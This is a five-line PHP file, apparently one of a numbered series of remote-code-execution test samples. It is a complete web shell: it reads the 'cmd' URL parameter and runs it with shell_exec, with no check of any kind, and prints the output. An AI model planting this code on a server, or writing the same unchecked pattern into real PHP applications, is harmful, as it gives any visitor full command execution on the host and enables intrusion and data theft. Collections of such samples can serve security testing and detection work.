<?php
// RCE test variation #1447
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>